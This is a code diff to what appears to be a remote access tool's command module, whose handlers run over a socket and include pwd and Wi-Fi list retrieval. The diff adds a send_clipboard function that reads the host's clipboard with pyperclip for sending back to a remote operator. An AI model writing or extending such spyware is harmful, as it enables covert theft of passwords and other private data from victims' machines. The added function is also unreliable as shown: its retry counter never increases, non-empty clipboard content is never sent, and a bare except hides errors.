@@ -1,10 +1,10 @@
 from socket_handlers import *
 from urllib.parse import unquote
-import os, base64, binascii, requests, ctypes, subprocess, psutil, json, platform, re
+import os, base64, binascii, requests, ctypes, subprocess, psutil, json, platform, re, pyperclip
 from pathvalidate import sanitize_filename, sanitize_filepath
-from typing import Tuple
 from mss import mss
 from datetime import datetime
+from time import sleep
 
 
 def pwd(socket):
@@ -863,3 +863,24 @@ def get_wifi_list(socket: socket.socket) -> bool:
     except Exception as e:
         socket_send(socket, f"Unexpected error: {str(e)}")
         return False
+
+
+def send_clipboard(
+    socket: socket.socket, max_retries: int = 3, retry_delay: float = 1.0
+) -> bool:
+    retry_count = 0
+
+    while retry_count < max_retries:
+        try:
+            try:
+                clipboard_content = pyperclip.paste()
+            except Exception as e:
+                socket_send(socket, f"Error in reading clipboard: {e}")
+                return False
+
+            if not clipboard_content.strip():
+                socket_send(socket, "Clipboard is empty")
+                return True
+
+        except:
+            pass
